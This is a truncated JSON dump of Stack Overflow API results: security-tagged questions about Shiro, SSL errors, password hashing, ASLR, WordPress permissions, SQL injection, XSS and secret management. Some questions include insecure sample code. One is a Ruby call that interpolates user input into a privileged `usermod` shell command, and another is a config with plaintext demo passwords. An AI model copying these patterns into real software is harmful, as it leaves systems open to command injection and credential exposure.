1\"&gt;&lt;/h:commandLink&gt;\n&lt;/h:form&gt;\n</code></pre>\n\n<p>2.) Backing bean:</p>\n\n<pre><code>@Stateless\n@Named\npublic class UserBean {\n    @Inject\n    private Logger log;\n\n    @RequiresAuthentication\n    public void action1() {\n        log.debug(\"action.1\");\n    }\n}\n</code></pre>\n\n<p>3.) web.xml</p>\n\n<pre><code>&lt;listener&gt;\n    &lt;listener-class&gt;org.apache.shiro.web.env.EnvironmentLoaderListener&lt;/listener-class&gt;\n&lt;/listener&gt;\n\n&lt;filter&gt;\n    &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt;\n    &lt;filter-class&gt;org.apache.shiro.web.servlet.ShiroFilter&lt;/filter-class&gt;\n&lt;/filter&gt;\n\n&lt;filter-mapping&gt;\n    &lt;filter-name&gt;ShiroFilter&lt;/filter-name&gt;\n    &lt;url-pattern&gt;/*&lt;/url-pattern&gt;\n&lt;/filter-mapping&gt;\n</code></pre>\n\n<p>4.) shiro.ini</p>\n\n<pre><code>[main]\n# listener = org.apache.shiro.config.event.LoggingBeanListener\n\nshiro.loginUrl = /login.xhtml\n\n[users]\n# format: username = password, role1, role2, ..., roleN\nroot = secret,admin\nguest = guest,guest\npresidentskroob = 12345,president\ndarkhelmet = ludicrousspeed,darklord,schwartz\nlonestarr = vespa,goodguy,schwartz\n\n[roles]\n# format: roleName = permission1, permission2, ..., permissionN\nadmin = *\nschwartz = lightsaber:*\ngoodguy = winnebago:drive:eagle5\n\n[urls]\n# The /login.jsp is not restricted to authenticated users (otherwise no one could log in!), but\n# the 'authc' filter must still be specified for it so it can process that url's\n# login submissions. It is 'smart' enough to allow those requests through as specified by the\n# shiro.loginUrl above.\n/login.xhtml = authc\n/logout = logout\n/account/** = authc\n/remoting/** = authc, roles[b2bClient], perms[\"remote:invoke:lan,wan\"]\n</code></pre>\n\n<p>But when I click the button, it still performs the action. It should throw unauthorizede exception right? The same is true with other shiro annotations.</p>\n\n<p>Note that if I manually performs the check, it works:</p>\n\n<pre><code>public void action1() {\n    Subject currentUser = SecurityUtils.getSubject();\n    AuthenticationToken token = new UsernamePasswordToken(\"guest\", \"guest\");\n    currentUser.login(token);\n\n    log.debug(\"user.\" + currentUser);\n    if (currentUser.isAuthenticated()) {\n        log.debug(\"action.1\");\n    } else {\n        log.debug(\"not authenticated\");\n    }\n}\n</code></pre>\n\n<p>Thanks,\n<br />czetsuya</p>\n"},{"tags":["java","security","email","sslhandshakeexception"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":57,"score":0,"question_id":12832354,"title":"SSLHandshakeException in Mail Sending Code","body":"<p>I am developing code for sending email from my domain to gmail.com</p>\n\n<p>I get a <code>SSLHandshakeException</code> (see below).<br>\nHow to Solve this??</p>\n\n<pre><code>Exception in thread \"main\" javax.mail.MessagingException: Could not convert socket to TLS;\n  nested exception is:\njavax.net.ssl.SSLHandshakeException: sun.security.validator.ValidatorException: \n    PKIX path building failed: sun.security.provider.certpath.SunCertPathBuilderException: \n    unable to find valid certification path to requested target\n</code></pre>\n"},{"tags":["php","security","hash","password-protection"],"answer_count":3,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":122,"score":3,"question_id":11965708,"title":"PHP - hash_pbkdf2 function","body":"<p>I'm trying to do a function to hash passwords with this php function: <a href=\"http://be.php.net/manual/en/function.hash-pbkdf2.php\" rel=\"nofollow\">http://be.php.net/manual/en/function.hash-pbkdf2.php</a>.</p>\n\n<p>Here is the code:</p>\n\n<pre><code>$hash_algo = \"sha256\";\n$password = \"password\";\n$salt = \"salt\";\n$iterations = 1;\n$length = 1;\n$raw_output = false;\n\n$hash = hash_pbkdf2($hash_algo, $password, $salt, $iterations ,$length ,$raw_output);\n\necho $hash;\n</code></pre>\n\n<p>I got this error: <strong>Fatal error: Call to undefined function hash_pbkdf2().</strong></p>\n\n<p>How can the function be undefined???</p>\n\n<p>PS: All the values of my variables are set just for testing the function. Obviously the salt will not be \"salt\", etc.</p>\n"},{"tags":["security","dotnetnuke"],"answer_count":3,"favorite_count":0,"up_vote_count":6,"down_vote_count":0,"view_count":2223,"score":6,"question_id":138175,"title":"DotNetNuke vulnerabilities","body":"<p>Anyone familiar with specific security issues in the current version of DotNetNuke?<br />\n(I've already checked out their site, securityfocus, etc...)</p>\n\n<p>I've reopened the question, since my client developed their system using DotNetNuke - hence it is a programming question. I just need to know some issues regarding this platform.</p>\n"},{"tags":["ios","osx","security","osx-lion","ios6"],"answer_count":1,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":65,"score":3,"question_id":12824045,"title":"What exactly is randomized with ASLR in MacOS X and iOS","body":"<p>Does anybody have a link to a documentation what exactly is randomized in what cases for latest Mac OS (10.7) and iOS (6.0)?</p>\n\n<p>I mean. I want to see a list (something like)</p>\n\n<ul>\n<li><p>Code segment (in a case A,B,C)</p></li>\n<li><p>Stack (always)</p></li>\n<li><p>Heap</p></li>\n<li><p>Data segment (never)</p></li>\n</ul>\n\n<p>Preferably with how many bits of randomization each thing has.</p>\n\n<p>All I can find is something like: \"MacOS Lion implements full ASLR\" and in other places \"full ASLR is implemented different ways for different operation systems\", which is obviously not very informative.</p>\n"},{"tags":["java","string","security","passwords","char"],"answer_count":9,"favorite_count":123,"up_vote_count":478,"down_vote_count":1,"view_count":34238,"score":477,"question_id":8881291,"title":"Why is char[] preferred over String for passwords?","body":"<p>In <a href=\"http://en.wikipedia.org/wiki/Swing_%28Java%29\">Swing</a>, the password field has a <code>getPassword()</code> (returns <code>char[]</code>) method instead of the usual <code>getText()</code> (returns <code>String</code>) method. Similarly, I have come across a suggestion not to use <code>String</code>s to handle passwords. Why does <code>String</code> pose a threat to security when it comes to passwords?</p>\n\n<p>It feels inconvenient to use <code>char[]</code>.</p>\n"},{"tags":["wordpress","security","ubuntu","permissions"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":44,"score":1,"question_id":12827513,"title":"What permissions should a wordpress installation have to be secure but functional?","body":"<p>I've already read <a href=\"http://codex.wordpress.org/Hardening_WordPress\" rel=\"nofollow\">http://codex.wordpress.org/Hardening_WordPress</a> but I can't get my head around it. What are the permissions that shall be set and by who shall it be owned by? Right now I have set as the result of the following commands:</p>\n\n<pre><code># reset to safe defaults\nfind /usr/share/wordpress -exec chown www-data:www-data {} \\;\nfind /usr/share/wordpress -type d -exec chmod 755 {} \\;\nfind /usr/share/wordpress -type f -exec chmod 644 {} \\;\n\n# allow wordpress to manage wp-config.php (but prevent world access)\nchgrp www-data /usr/share/wordpress/wp-config.php\nchmod 660 /usr/share/wordpress/wp-config.php\n\n# allow wordpress to manage .htaccess\nchgrp www-data /usr/share/wordpress/.htaccess\nchmod 664 /usr/share/wordpress/.htaccess\n\n# allow wordpress to manage wp-content\nfind /usr/share/wordpress/wp-content -exec chgrp www-data {} \\;\nfind /usr/share/wordpress/wp-content -type d -exec chmod 775 {} \\;\nfind /usr/share/wordpress/wp-content -type f -exec chmod 664 {} \\;\n</code></pre>\n\n<p>After this configuration the installation is unusable. Any tips?</p>\n"},{"tags":["ruby","security","shell","system","sanitization"],"answer_count":3,"favorite_count":3,"up_vote_count":7,"down_vote_count":0,"view_count":1461,"score":7,"question_id":4650636,"title":"Forming sanitary shell commands or system calls in Ruby","body":"<p>I'm building a daemon that will help me manage my server(s). Webmin works fine, as does just opening a shell to the server, but I'd prefer to be able to control server operations from a UI I design, and also expose some functionality to end users.</p>\n\n<p>The daemon will pick up actions from a queue and execute them. However, since I'll be accepting input from users, I want to make sure they're not permitted to inject something dangerous into a privileged shell command.</p>\n\n<p>Here's a fragment that exemplifies my problem:</p>\n\n<pre><code>def perform\n  system \"usermod -p #{@options['shadow']} #{@options['username']}\"\nend\n</code></pre>\n\n<p>A gist that explains more: <a href=\"https://gist.github.com/773292\" rel=\"nofollow\">https://gist.github.com/773292</a></p>\n\n<p>I'm not positive if typical escaping and sanitizing of inputs is enough for this case, and being a designer, I don't have a ton of security-related experience. <strong>I know that this is something that should probably be obvious to me</strong>, but its not!</p>\n\n<p>How can I ensure that the web application that will create and serialize the actions can't pass dangerous text into the privileged process that receives the actions?</p>\n\n<p>Thanks for the help<br>\narb</p>\n"},{"tags":["iphone","ios","security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":221,"score":1,"question_id":9141583,"title":"How to detect that PIE/ASLR has been enabled for my iOS app?","body":"<p>I am enabling PIE (position-independent executable)/ASLR (address space layout randomization) for an iPhone app by using the <code>\"-w -pie\"</code> linking option flag. Is there any way I can ensure that things are now set to work as advertised? I tried printing the address of a variable <em>(Edit: and a function)</em> with NSLog and it comes up the same each time. Am I doing it right?</p>\n"},{"tags":["sql","security","web-applications"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":57,"score":1,"question_id":12827129,"title":"Protection against timing attack on data integrity","body":"<p>Scenario: web based text game</p>\n\n<ol>\n<li>Player A sends request to send 10,000 credits to player B (this request takes 20ms to complete). </li>\n<li>3ms after sending first request (which is still being processed) player A sends another request to battle player C, this request takes 100ms to complete.</li>\n</ol>\n\n<p>What's happening, in step 1 an app removes credits from player A, gives them to player B, but before this is persisted in the db, second request comes, loads state still showing 10k in an account of player A and overwrites correct state from request 1 (0 credits) with 10k + battle loot from step 2. Result: player A and B both have now 10k in their accounts, the money just doubled.</p>\n\n<p>What can be done to protect against this? This is hypothetical scenario to show the problem, for above scenario <code>account=account+loot</code> sql would do, but I'm looking for solution that works with all data types.</p>\n"},{"tags":["c#","security","validation","razor","webmatrix"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":59,"score":2,"question_id":12826020,"title":"WebMatrix SQL injection & XSS concerns after paramaterizing queries","body":"<p>I have a simple question that concerns security in WebMatrix razor (C#)</p>\n\n<p>I (for a very brief period of time) considered using character checking to help validate forms to combat SQL injection, however, after realizing that parameterizing queries is the best way to combat this, I have since commented out this check which looks something like this:</p>\n\n<pre><code>    foreach(char c in POIName)\n    {\n        if(c=='\\'' || c=='$' || c=='\\\"' || c=='&amp;' || c=='%' || c=='@' || c=='-' || c=='&lt;' || c=='&gt;')\n        {\n            errorMessage = \"You have entered at least one invalid character in the \\\"POI Name\\\" field. Invalid characters are: [\\'], [\\\"], [&amp;], [$], [@], [-], [&lt;], [&gt;], and [%]\";\n        }\n    }\n</code></pre>\n\n<p>Now, my question is this:\nShould I remove lines like these entirely, as they are not needed (to allow maximum user freedom in textareas etc.) or should there still be some character checking specific to WebMatrix (or not specific to it for that matter).</p>\n\n<p>Perhaps not allow \"@\" or \";\" or \"&lt;\" or \">\"??</p>\n\n<p>From what I understand paramaterizing the queries (as I have) auto escapes harmful characters and re-wraps the whole thing as a string (or something like that anyway, lol), and my database has proven impervious to any of the SQL injection attacks I have thrown at it.</p>\n\n<p>I guess I am concerned because I am not sure if razor can be effected somehow or if I should worry about XSS (no I am not a blog or anything that should ever accept html tags or even angle brackets of any kind).</p>\n\n<p>Sorry if this question is kind of all over the place, but I don't know where else to turn to find as definitive of an answer as Stack Overflow usually provides (e.g., I trust this community much more than a few Google searches, which I assure I have tried before posting).</p>\n\n<p>Thanks for any help!</p>\n"},{"tags":["php","security",".htaccess","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":269,"score":0,"question_id":9412997,"title":"Codeigniter & disallowed key characters issue with my htaccess","body":"<p>I have setup an htaccess rule (see below)</p>\n\n<pre><code>RewriteRule ^images/(.*) http://www.mysite.com [R=301,L]\n</code></pre>\n\n<p>My intention is that any of the following links will be redirected to site.com the problem is the question mark character (?) as this causes an 'Disallowed key characters' error in Codeigniter framework. I could modify the permitted characters in the config file but this is not recommended for security purposes.</p>\n\n<p>The links I aim to redirect looks like the following..</p>\n\n<pre><code>http://www.site.com/images/flash/main.swf?config=/flash/flash_output/133/location.htm\n</code></pre>\n\n<p>Can anyone suggest a workaround that doesn't involve <a href=\"http://stackoverflow.com/q/9413223/367456\">changing the permitted characters in the config</a>, or is this the only workable option?</p>\n"},{"tags":["php","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":44,"score":-2,"question_id":12825903,"title":"salted password","body":"<p>I'm a novice php programmer, and with the help of PHP books and tutorials I recently started to learn about salted passwords. </p>\n\n<p>What I would like to do is this: </p>\n\n<p>1 A random generated salt for each new user; (done) </p>\n\n<p>2 A SHA512 hash; (done) </p>\n\n<p>3 Send to my database my treated password and salt; (done) </p>\n\n<p>4 Validating when users login; </p>\n\n<p>5 In the validation login system if the user fails 3 attempts is kicked out for a certain time period.  </p>\n\n<p>Does anyone knows a good php code, book or tutorial for the 4 and 5 steps? </p>\n\n<p>Thanks in advance for the replies... </p>\n"}]}
{"total":17772,"page":9,"pagesize":100,"questions":[{"tags":["c#","web-services","security"],"answer_count":3,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":182,"score":1,"question_id":9568414,"title":"C# web service password in the request to be encrypted","body":"<p>I am working on the web service.  A user is going to be able to create a user account using a form on different asp.net project. So when the user enters the password information I need to store that encrpted in a database.  But now when the user sends the user credentials through for a web services then I need to the user to send that password encrpted for security purposes. </p>\n\n<p>Now how can we both have the same ecrption procedure so that I will be able to validate the request.</p>\n"},{"tags":["security","google-app-engine","rest"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12819784,"title":"How to make sure that my mobile app back end is not called by other app?","body":"<p>I'm starting to have a look at mobile development and precisely Android Development.</p>\n\n<p>The mobile App will be mainly UI, and all the business will occur on a web application hosted by Google App Engine (the communicaiton will be in rest I think).</p>\n\n<p>How can I make sure that my rest api is not called by any other software/app ? Because anyone can sniff the network, get my api calls, then forge theirs. That shouldn't be a problem if my api was well designed and flawless, but that's certainly not gonna be the case.</p>\n\n<ul>\n<li><p>Login/Password is not a solution because it can be sniffed</p></li>\n<li><p>SSL communication also because the user can use the same certificate for his own app</p></li>\n</ul>\n\n<p>I think that there is not perfect way, but only partial solution (like hiding the certificate with any ugly technique so even the decompilation wouldn't help).</p>\n\n<p>EDIT :</p>\n\n<p>I found this : <a href=\"http://stackoverflow.com/questions/9823391/how-to-make-sure-api-requests-come-from-our-mobile-ios-android-app\">How to make sure API requests come from our mobile (ios/android) app?</a></p>\n\n<p>But I wonder if there is any already existing way of doing this in Http or App Engine or anything else. I don't really like to code security code myself.</p>\n\n<p>Rmi</p>\n"},{"tags":["security","encryption","cryptography"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":114,"score":1,"question_id":1988513,"title":"Revealing the length of the plain-text?","body":"<p>If I have just encrypted some plain-text into cipher-text with CBC and Rijndael, is it insecure to tell the world that the original plain-text had a length of x bytes? It seems that it's always the same as the length of the cipher-text, so, I think it does not matter, but are there some block modes or ciphers where it does matter?</p>\n"},{"tags":["c#",".net","security","encryption"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":144,"score":0,"question_id":2739981,"title":"Implementing a program that generates non-transferable licences","body":"<p>I'm taking a security class and am required to implement a licensing server that sends licenses that are non-transferable. I have no idea how to do that. Could you please give me some of your ideas?</p>\n"},{"tags":["asp.net","security"],"answer_count":3,"favorite_count":3,"up_vote_count":2,"down_vote_count":1,"view_count":347,"score":1,"question_id":5063769,"title":"Are there any Asp.net security tools and/or frameworks?","body":"<p>As per the increasing security threats, my site needs extreme care in terms of security in all aspects. I know asp.net has built in some security measures (Anti-forgery token, cross-site scripting, authentication, roles), but that is just not enough.</p>\n\n<p>I need a tool to test <strong>all possible</strong> security threats (Brute-force attacks, .... IP location, browser info ...  )\nand a framework (open source is better) that handles all these concerns and let you build upon.</p>\n\n<p><strong>EDIT</strong>\nSo to narrow a bit, my primary concern is protecting the \"login\" page from all possible threats.</p>\n\n<p>Help is highly appreciated !</p>\n\n<p>P.S. If someone can not answer, please skip the question and spare the comments and negative votes. Thanks.</p>\n"},{"tags":["security","validation","coldfusion","coldfusion-8","sanitize"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":52,"score":1,"question_id":12810456,"title":"Is there anything that provides the kind of support PHP's filter_var does in ColdFusion?","body":"<p>I've found <a href=\"http://php.net/manual/en/function.filter-var.php\" rel=\"nofollow\">filter_var</a> to be <strong>extremely</strong> useful in validating and sanitizing user input with PHP, but I've yet to find anything even remotely as convenient in ColdFusion (more specifically, CF8).</p>\n\n<p>Obviously I can hack together something using <a href=\"http://livedocs.adobe.com/coldfusion/8/htmldocs/functions_m-r_35.html#135742\" rel=\"nofollow\">REReplace</a>, but that would take significantly more time to code up and would be much uglier than using the pre-defined filters available in PHP. Is there a more efficient way or do I just need to bite the bullet?</p>\n"},{"tags":["java","security","static-analysis"],"answer_count":4,"favorite_count":2,"up_vote_count":6,"down_vote_count":0,"view_count":639,"score":6,"question_id":1246762,"title":"Security static analysis tools","body":"<p>I'm familiar with the typical usages of tools like FindBugs and PMD as they relate to finding sub-optimal code.  </p>\n\n<p>What I'm not familiar with are the static analysis tools designed specifically for finding <strong>security flaws</strong> in code.  e.g. sql-injection, spoofing, and other security flaws.</p>\n\n<p>What kinds of experiences and recommendations do people have with these tools?</p>\n"},{"tags":["asp.net-mvc-3","wcf","security","azure","webrole"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":74,"score":0,"question_id":12820368,"title":"Azure: security between web roles","body":"<p>In Azure, if you choose to use internal endpoint (instead of input endpoint), https is not an option. http &amp; tcp are the only options. Does it mean internal endpoint is 100% secure and you don't need encryption. </p>\n\n<p>Then it comes to another question. If i choose to use input endpoint between mvc application and wcf service. Is it really necessary to have https between them? Is it OK if i have 2 input endpoints for wcf. One with http on port 80, which is supposed to be used by mvc application. Another with https on port 443, which can be used by somebody else. (not our own application) </p>\n"},{"tags":["ruby-on-rails","security","heroku","jruby","cloudbees"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":53,"score":2,"question_id":12732818,"title":"When trying to configure Rails Ruby or jRuby app the secret key is visible in the YAML file. Is there a gem that will provide this at runtime?","body":"<p>There are lots of secrets that apps have that need to be secured in production when running in public cloud and PaaS environments.  Common one is database.yml entries for mysql user and password, but there can be others.  Your Google App secret, facebook app secret,... the list goes on.  There are no clear way of securing these essentially configuration parameters.  You <em>DO NOT</em> want to put these in a file as there is no guarantee who will have access to it.</p>\n\n<p>In Heroku you can specify things via environment variables.  In Cloudbees (a Java PaaS) you can specify these as Java System properties.  Both Heroku and Cloudbees have a commandline utility for uploading this configuration parameters but there is no support for making this work both in development and production easily.</p>\n\n<p>Question is how do you configure your parameters so that you can develop easily in development but not have the production secret be available in development</p>\n\n<p>Ideally there would be a gem that will work in ruby and jruby environment and PaaS that will allow me to specify me secrets in a YML file that has development settings in development but actual production secrets pulled in from <code>ENV</code> or <code>java.lang.System.getProperty</code>.</p>\n\n<pre><code>##\n# file: config/secure_config.yml\ndevelopment:\n  db:\n    user_id: 'dev_mysql_user'\n    password: 'my_dev_pwd'\n  google:\n    app_id: 'xxxxx' # this is the secret for the dev app so it can be visible\n    app_secret: 'xxxxx'\n# ...\nproduction:\n  db:\n    user_id: &lt;%= get_secure_config %&gt;\n    password: &lt;%= get_secure_config %&gt;\n  google:\n    app_id: &lt;%= get_secure_config %&gt;\n    app_secret: &lt;%= get_secure_config %&gt;\n</code></pre>\n\n<p>Where the get_secure_config helper gets the value from <code>ENV</code> or <code>java.lang.System.getProperty</code> in case of Ruby or jRuby.  The finally you can use them in your app as needed.  For example in database.yml or in the devise code to authenticate using google.</p>\n\n<pre><code># config/database.yml\n# ...\nproduction:\n  adapter: mysql2\n  username: &lt;%= SecureConfig.db.user_id %&gt;\n  password: &lt;%= SecureConfig.db.password %&gt;\n</code></pre>\n\n<p>And then for extra coolness the gem should also give me an executable that allows me to push the config to my PaaS</p>\n\n<pre><code>~/work/myproject&gt; bundle exec secure_config -push_to_heroku\n</code></pre>\n\n<p>or</p>\n\n<pre><code>~/work/myproject&gt; bundle exec secure_config -push_to_cloudbees\n</code></pre>\n"},{"tags":["php","html","forms","security"],"answer_count":5,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12818698,"title":"Anything wrong with storing form values as Session variables?","body":"<p>Is there any reason I shouldn't store form data like so? Is this an OK practice? I have some things like our business email address that I don't want visible on the client side.</p>\n\n<pre><code>&lt;input type=\"hidden\" name=\"amount\" id=\"amount\" value=\"&lt;?php echo $_SESSION['amount']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"item_name\" value=\"&lt;?php echo $_SESSION['plan_name']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"p3\" value=\"&lt;?php echo $_SESSION['period']; ?&gt;\"&gt;\n&lt;input type=\"hidden\" name=\"my_email\" value=\"&lt;?php echo $_SESSION['my_email']; ?&gt;\"&gt;\n&lt;input type=\"src\" name=\"t3\" value=\"&lt;?php echo $_SESSION['recurring']; ?&gt;\"&gt;\n</code></pre>\n\n<p>I forgot to mention that the fields are empty on page load. They get populated by an AjAX return data.</p>\n"},{"tags":["windows","security","unix","operating-system"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":4,"view_count":58,"score":-4,"question_id":12818211,"title":"How UNIX is more secured than Windows?","body":"<p>How the UNIX type OS is said to be more secured than Windows? Why UNIX is preferred for Web servicing rather than Windows?</p>\n"},{"tags":["javascript","json","security","xss","urlencode"],"answer_count":3,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":117,"score":4,"question_id":11400990,"title":"Is there any XSS threat while having JSON encoded in the URL?","body":"<p>In order to have an URL friendly application I'm storing it's context has a JSON in URL, which gives something like : </p>\n\n<pre><code>http://mysite.dev/myapppage/target#?context={%22attr1%22%3A{%22target_id-0%22%3A{%22value%22%3A%223%22%2C%22label%22%3A%22Hello%22}}}\n</code></pre>\n\n<p>Which encode a basic context :</p>\n\n<pre><code>{\n\"attr1\":\n    {\n    \"target_id-0\":\n        {\n        \"value\": \"3\",\n        \"label\": \"Hello\"\n        }\n    }\n}\n</code></pre>\n\n<p>I'm serializing my object with :</p>\n\n<pre><code>JSON.stringify(context)\n</code></pre>\n\n<p>I'm deserializing it with :</p>\n\n<pre><code>var hashParamsElements = window.location.toString().split('?');\nhashParamsElements.shift(); // we just skip the first part of the url\nvar hashParams = $.deparam(hashParamsElements.join('?'));\nvar contextString = hashParams.context;\nvar context = JSON.parse(contextString);\n</code></pre>\n\n<p>The context is only stored to read variables, there's no evaluated code in it. Can someone tell me whether or not it's XSS safe ?</p>\n\n<p>If there's a threat : how can I avoid it ?</p>\n"},{"tags":["java","c","security","encryption","client-server"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":5,"view_count":131,"score":-4,"question_id":12676088,"title":"Client server encryption over multiple programming languages","body":"<p>I'm writing a server program in C and a client in Java. I have got nearly everything I want working correctly but am completely stuck on encryption. As this is for a nuclear power station they want all communications encrypted. I know how to make RSA and AES keys in both the languages, but does anyone know of a way of making either Java or C encryption keys and loading them in the other language? Trying to avoid using JNI.</p>\n\n<p>Any advice would be much appreciated. Cheers</p>\n"},{"tags":["javascript","jquery","security","cakephp"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":144,"score":1,"question_id":11694865,"title":"Black Holed Request Cakephp","body":"<p>On my index page I have check boxes in each row of my table.</p>\n\n<p>To edit selected items, I use javascript/jquery to grab the class of the checkboxes, build an array of the ids and then post it to the edit selected method in my controller.</p>\n\n<p>Now, this all works perfectly, but when Security in enabled in my App Controller, my post gets black holed and the array is not posted.</p>\n\n<p>Here is my index.ctp file:</p>\n\n<pre><code>&lt;table id=\"indexTable\"&gt;\n    &lt;thead&gt;&lt;tr&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Form-&gt;checkbox('select_all', array('value' =&gt; 'select_all')); ?&gt; &lt;/th&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Paginator-&gt;sort('id', 'ID'); ?&gt; &lt;/th&gt;\n        &lt;th&gt; &lt;?php echo $this-&gt;Paginator-&gt;sort('name', 'Name'); ?&gt; &lt;/th&gt;\n        &lt;th&gt;Auto Offset  &lt;/th&gt;  &lt;th&gt;UTC Offset Sec  &lt;/th&gt;  &lt;th&gt;In Month  &lt;/th&gt;\n        &lt;th&gt;In Week      &lt;/th&gt;  &lt;th&gt;In Dow          &lt;/th&gt;  &lt;th&gt;In Hour   &lt;/th&gt;  &lt;th&gt;Out Month   &lt;/th&gt;\n        &lt;th&gt;Out Week     &lt;/th&gt;  &lt;th&gt;Out Dow         &lt;/th&gt;  &lt;th&gt;Out Hour  &lt;/th&gt;  &lt;th&gt;Offset Sec  &lt;/th&gt;\n        &lt;th&gt;DST Ref      &lt;/th&gt;  &lt;th&gt;Actions      &lt;/th&gt;\n    &lt;/tr&gt;&lt;/thead&gt;\n\n    &lt;tbody&gt;\n\n&lt;?php\n$this-&gt;Form-&gt;create('LocalClock');\nforeach($localClocks as $LocalClock) { ?&gt;\n        &lt;tr&gt;\n            &lt;td&gt;  &lt;?php echo $this-&gt;Form-&gt;checkbox('LocalClocks'.$LocalClock['LocalClock']['id'], array('value' =&gt; $LocalClock['LocalClock']['id'], 'hiddenField' =&gt; false));?&gt;  &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['id']; ?&gt;              &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['name']; ?&gt;            &lt;/td&gt;\n            &lt;td&gt;  &lt;?php echo $LocalClock['LocalClock']['auto_offset']; ?&gt;     &lt;/td&gt;\n        &lt;/tr&gt;\n&lt;?php } ?&gt;\n    &lt;/tbody&gt;\n&lt;/table&gt;\n\n&lt;/div&gt;\n\n&lt;!-- This &lt;div&gt; contains all the actions that can be performed on the Local Clocks. --&gt;\n&lt;div&gt;\n    &lt;p&gt;\n\n        &lt;span style=\"float: left\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Edit All Items'), array('action' =&gt; 'editAll'), array('class' =&gt; 'link'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n\n        &lt;span style=\"float: left\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Edit Selected Items'), array('action' =&gt; 'lceditSelected'), array('class' =&gt; 'general_dialog'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n\n        &lt;span style=\"float: right\"&gt;\n            &lt;?php echo $this-&gt;Html-&gt;link(__('Delete Selected Items'), array('action' =&gt; 'deleteSelected'), array('class' =&gt; 'general_dialog'));?&gt; &amp;nbsp;&amp;nbsp;\n        &lt;/span&gt;\n    &lt;?php $this-&gt;Form-&gt;end(); ?&gt;\n\n    &lt;/p&gt;\n&lt;/div&gt;\n</code></pre>\n\n<p>I took out some unimportant stuff.  The problem is with my edit selected and delete selected functions.</p>\n\n<p>Here is the javascript code that waits for their click and then builds the array to post to the controller action:</p>\n\n<pre><code>$('.general_dialog').live('click', function()\n{\n    $.ajaxSetup({ async: false });\n\n        var $selDialog = $(\"#general_dialog\").dialog(\n        {\n            autoOpen: false,\n            modal: true,\n        });\n\n        var postInfo = $('#LocalClockIndexForm').serialize();\n        $.ajax({\n        url: $(this).attr('href'),\n        type: \"post\",\n        data: postInfo,\n        success: function (response)\n        {\n            alert('success');\n        },\n        error: function()\n        {\n            alert(\"failed\");\n        }\n    });\n        $selDialog.load($(this).attr('href'), function ()\n        {\n            $selDialog.dialog('open');\n        });\n    return false; // Ensure the controller does not redirect to the actual edit page\n});\n</code></pre>\n\n<p>Any help on how to get it to work without getting black holed would be greatly appreciated.</p>\n\n<p>Thanks in advance</p>\n\n<p>------------------------------------------EDIT----------------------------------------------\nI added <code>$this-&gt;Form-&gt;create('LocalClock')</code> and <code>$this-&gt;Form-&gt;end()</code> to the table and I switched the $.post() to and $.ajax() call.</p>\n\n<p>If I send the serialised form, I don't get a black hole, but when I look at the data posted, it does not include any of the check box ids.</p>\n"},{"tags":["python","django","security","urlfetch","malicious"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":50,"score":3,"question_id":12815448,"title":"URL fetch: prevent abuse, mailcious urls etc. in python/django","body":"<p>I'm building a webpage featuring a very much a-like the facebook wall/newsfeed. Registered users (or through Facebook-connect, google auth) can submit urls. At the moment, I'm taking these URLs and use urllib2 to fetch the content of the URL and search for relevant information like og:properties, HTML title-tag and perheps some -tags for images.</p>\n\n<p>Now, I understand that I'm putting my server at risk when I'm letting users feed my server with URLs to open.</p>\n\n<p>My question is how high the risk is? What standard security checks can I make?</p>\n\n<p>As for now, I am simply opening the url without any \"active\" protection because I don't know what to check for.</p>\n\n<p>And what about storing fetched content into the database. Does django have built-in protection against SQL-injections?</p>\n\n<p>Thank you!</p>\n"},{"tags":["security","jsf-1.2"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12815699,"title":"Restricting access to JSF files under WEB-INF : Navigation not happening","body":"<p>I have JSF 1.2 based <code>Servlet</code>. I want to restrict access to pages inside my <code>Servlet</code> by placing under <code>WEB-INF</code>. My post might seem to be duplicate of <a href=\"http://stackoverflow.com/questions/3512234/jsf-files-inside-web-inf-directory-model-2-pattern\">this</a> post. But, I tried the options suggested by BalusC and my questions are based on those answers.</p>\n\n<p>\"Restricting access\" means, suppose there are two JSF pages, user should be able to visit 2nd JSF page only from 1st JSF page. User should not see 2nd JSF page by hitting http:/myDomain/mySecondPage.jsf</p>\n\n<p>Based on the answers of 